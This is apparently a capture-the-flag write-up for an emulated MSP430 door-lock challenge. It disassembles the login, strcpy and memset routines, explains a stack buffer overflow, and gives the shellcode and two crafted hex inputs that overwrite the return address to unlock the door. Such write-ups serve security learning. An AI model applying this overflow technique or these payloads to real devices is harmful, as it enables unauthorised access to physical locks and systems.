    This is Hardware  Version C.  It contains  the Bluetooth connector
    built in, and two available  ports: the LockIT Pro Deadbolt should
    be  connected to  port  1,  and the  LockIT  Pro  HSM-2 should  be
    connected to port 2.

    This is Software Revision 03. We have received unconfirmed reports
    of issues with the previous series of locks. We have reimplemented
    much  of the  code according  to our  internal Secure  Development
    Process.
    
So they claim they fixed the code this time.
Let's see.

4438 <main>
4438:  b012 f444      call	#0x44f4 <login>

Login:

44f4 <login>
44f4:  3150 f0ff      add	#0xfff0, sp
44f8:  3f40 7044      mov	#0x4470 "Enter the password to continue.", r15
44fc:  b012 b045      call	#0x45b0 <puts>
4500:  3f40 9044      mov	#0x4490 "Remember: passwords are between 8 and 16 characters.", r15
4504:  b012 b045      call	#0x45b0 <puts>

Disregarding the above code..

4508:  3e40 3000      mov	#0x30, r14
450c:  3f40 0024      mov	#0x2400, r15
4510:  b012 a045      call	#0x45a0 <getsn>
4514:  3e40 0024      mov	#0x2400, r14
4518:  0f41           mov	sp, r15
451a:  b012 dc45      call	#0x45dc <strcpy>
451e:  3d40 6400      mov	#0x64, r13
4522:  0e43           clr	r14
4524:  3f40 0024      mov	#0x2400, r15
4528:  b012 f045      call	#0x45f0 <memset>
452c:  0f41           mov	sp, r15
452e:  b012 4644      call	#0x4446 <conditional_unlock_door>
4532:  0f93           tst	r15
4534:  0324           jz	#0x453c <login+0x48>
4536:  3f40 c544      mov	#0x44c5 "Access granted.", r15
453a:  023c           jmp	#0x4540 <login+0x4c>
453c:  3f40 d544      mov	#0x44d5 "That password is not correct.", r15
4540:  b012 b045      call	#0x45b0 <puts>
4544:  3150 1000      add	#0x10, sp
4548:  3041           ret

After inspecting <login> and <conditional_unlock_door>
The only difference from last challenge that I could spot is the calls to <strcpy> and <memset>
So let's look further into these functions and how they work:

From the c++ reference manual:

----------------------------------------------------------------------------------------------------------------------------------------
char * strcpy ( char * destination, const char * source );
Copy string
Copies the C string pointed by source into the array pointed by destination, including the terminating null character (and stopping at that point).

To avoid overflows, the size of the array pointed by destination shall be long enough to contain the same C string as source (including the terminating null character), and should not overlap in memory with source.

----------------------------------------------------------------------------------------------------------------------------------------

By looking at the call to <strcpy> it seems that we use r14 as source and r15 as destination.

4514:  3e40 0024      mov	#0x2400, r14
4518:  0f41           mov	sp, r15
451a:  b012 dc45      call	#0x45dc <strcpy>

Alright lets look more in detail now:

45dc:  0d4f           mov	r15, r13
45de:  023c           jmp	#0x45e4 <strcpy+0x8>
45e0:  1e53           inc	r14
45e2:  1d53           inc	r13
45e4:  6c4e           mov.b	@r14, r12
45e6:  cd4c 0000      mov.b	r12, 0x0(r13)
45ea:  4c93           tst.b	r12
45ec:  f923           jnz	#0x45e0 <strcpy+0x4>
45ee:  3041           ret

A break at 451a reveals that r15 is 43ee, the location the password will be stored in.
We're just copying the password byte by byte from r14 to r13 until we hit a 00 byte (the terminating null character).

void * memset ( void * ptr, int value, size_t num );
Fill block of memory
Sets the first num bytes of the block of memory pointed by ptr to the specified value (interpreted as an unsigned char).

Memset is a big function so I decided id opt for dynamic analysis.
I used pppppppppppppppppppppppppppppppppppp as password, and it seems like memset just zeros out the password u copied into 0x2400. I guess to prevent any code execution from that address.

Everything else seems to be uninteresting.
Back to <main>, i set a break at 4544, and it revealed that sp is 43ee just like last time.

Well the "fix" they performed here is that if we entered the same shellcode as before as input then it wont be copied completely.
You see the shellcode is as follows:
30127f00b0123245aaaaaaaaaaaaaaaa7834

The 00 byte is the problem, because <strcpy> stops copying as soon as it encounters a 00. We can't point to the 0x2400 address either because it got cleared by <memset>.

30127f00b0123245aaaaaaaaaaaaaaaa7834

What we can do is seperate the call and push instructions and send them seperately by calling the code that asks for a password again.
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaf444aaaaaaaaaaaab0124c45 (1st input) 
The f4444 is so to call <login> again, so we can enter the remaining shellcode.
We're going to replace a part of the a's with the push instruction, and enter a call to the shellcode.
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa024430127f00 (2nd input)
The reason for  the change in the position of the call is because the value of sp is different by the time we hit the ret instruction.
A break reveals that after entering the 2nd input sp is 4400 when we hit ret.
Door unlocked.
